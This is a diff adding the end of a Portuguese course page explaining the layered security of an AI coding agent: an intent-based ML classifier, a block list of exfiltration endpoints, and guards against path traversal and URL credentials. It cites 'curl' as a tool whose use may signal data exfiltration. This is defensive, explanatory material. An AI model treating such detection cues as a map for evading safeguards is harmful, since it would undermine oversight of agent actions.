+        <h3 class="text-lg font-bold text-blue-400 mb-4">Como o Classificador ML Funciona</h3>
+        <div class="space-y-3">
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Análise semântica:</strong> Ao invés de regex, usa modelos treinados para entender a intenção real de um comando — "este comando está tentando exfiltrar dados?" ao invés de "este comando contém a palavra curl?"</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Aprovação contextual:</strong> Considera o contexto da conversa e do projeto para decidir se uma ação é razoável — <code class="bg-dark-700 px-1 rounded text-xs">curl</code> em um projeto web é normal, <code class="bg-dark-700 px-1 rounded text-xs">curl</code> em um projeto puramente local é suspeito</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">API de lista de bloqueio:</strong> A Anthropic mantém uma lista centralizada e atualizada de URLs maliciosas, domínios de phishing e endpoints de exfiltração conhecidos</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Camada opcional:</strong> O classificador ML atua como verificação adicional, nunca como substituto das camadas anteriores</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Box: Dica Prática -->
+      <div class="bg-primary/10 rounded-xl border border-primary/40 p-6 mb-6">
+        <h3 class="text-lg font-bold text-primary mb-3">💡 Defesa em Profundidade</h3>
+        <p class="text-neutral-300 leading-relaxed mb-4">O princípio fundamental de toda a arquitetura de segurança do Claude Code é <strong class="text-neutral-100">defesa em profundidade</strong>. Nenhuma camada individual é perfeita — e nenhuma precisa ser. O valor está na combinação:</p>
+        <div class="space-y-2">
+          <div class="flex items-start space-x-3">
+            <span class="flex-shrink-0 w-7 h-7 flex items-center justify-center rounded-full bg-primary/10 text-primary font-bold text-sm">1</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Sandbox</strong> limita o dano máximo possível</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="flex-shrink-0 w-7 h-7 flex items-center justify-center rounded-full bg-primary/10 text-primary font-bold text-sm">2</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Permissões</strong> controlam o que pode ser executado</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="flex-shrink-0 w-7 h-7 flex items-center justify-center rounded-full bg-primary/10 text-primary font-bold text-sm">3</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Guardas BashTool</strong> bloqueiam padrões perigosos conhecidos</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="flex-shrink-0 w-7 h-7 flex items-center justify-center rounded-full bg-primary/10 text-primary font-bold text-sm">4</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Análise de Comando</strong> decompõe e verifica cada parte</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="flex-shrink-0 w-7 h-7 flex items-center justify-center rounded-full bg-primary/10 text-primary font-bold text-sm">5</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Classificador ML</strong> entende a intenção, não apenas o texto</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- RESUMO DO MÓDULO -->
+    <!-- ============================================================ -->
+    <section class="mb-12">
+      <div class="bg-gradient-to-br from-blue-900/40 via-dark-800 to-dark-800 rounded-xl border border-blue-500/30 p-8">
+        <h2 class="text-2xl font-bold mb-6 flex items-center">
+          <span class="mr-3">📋</span> Resumo do Módulo
+        </h2>
+        <div class="space-y-4 mb-8">
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 font-bold mt-0.5">&#10003;</span>
+            <span class="text-neutral-300">A Sandbox isola a execução em um ambiente restrito — primeira muralha de defesa</span>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 font-bold mt-0.5">&#10003;</span>
+            <span class="text-neutral-300">O Sistema de Permissões oferece controle granular com allow, deny e ask por ferramenta</span>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 font-bold mt-0.5">&#10003;</span>
+            <span class="text-neutral-300">Os Guardas da BashTool executam 23+ verificações contra padrões maliciosos de shell</span>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 font-bold mt-0.5">&#10003;</span>
+            <span class="text-neutral-300">A Análise de Comando decompõe comandos compostos e verifica cada parte independentemente</span>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 font-bold mt-0.5">&#10003;</span>
+            <span class="text-neutral-300">Proteções específicas contra UNC, credenciais em URL, path traversal e mais</span>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 font-bold mt-0.5">&#10003;</span>
+            <span class="text-neutral-300">O Classificador ML entende intenção semântica — a camada mais sofisticada da fortaleza</span>
+          </div>
+        </div>
+        <div class="bg-dark-800/50 rounded-lg p-4 mb-8">
+          <h3 class="font-semibold text-blue-400 mb-2">Próximo Módulo:</h3>
+          <p class="text-neutral-300">2.3 - 📦 O Aperto</p>
+        </div>
+        <div class="flex flex-col sm:flex-row gap-4">
+          <a href="index.html" class="flex-1 text-center px-6 py-3 bg-dark-700 text-neutral-300 rounded-lg font-semibold hover:bg-dark-600 transition-colors">← Voltar para Trilha</a>
+          <a href="modulo-2-3.html" class="flex-1 text-center px-6 py-3 bg-blue-600 text-white rounded-lg font-semibold hover:bg-blue-500 transition-colors">Próximo Módulo →</a>
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- Footer -->
+  <footer class="border-t border-dark-600 py-8 mt-16">
+    <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 text-center text-neutral-500 text-sm">
+      <p>Por Dentro do Claude Code - 2026</p>
+    </div>
+  </footer>
+
+  <!-- Theme Toggle Script -->
+  <script>
+    const themeToggle = document.getElementById('theme-toggle');
+    const themeToggleDarkIcon = document.getElementById('theme-toggle-dark-icon');
+    const themeToggleLightIcon = document.getElementById('theme-toggle-light-icon');
+    const html = document.documentElement;
+    if (localStorage.getItem('theme') === 'light') { themeToggleDarkIcon.classList.remove('hidden'); html.classList.remove('dark'); } else { themeToggleLightIcon.classList.remove('hidden'); }
+    themeToggle.addEventListener('click', () => {
+      themeToggleDarkIcon.classList.toggle('hidden');
+      themeToggleLightIcon.classList.toggle('hidden');
+      html.classList.toggle('dark');
+      localStorage.setItem('theme', html.classList.contains('dark') ? 'dark' : 'light');
+    });
+  </script>
+
+</body>
+</html>
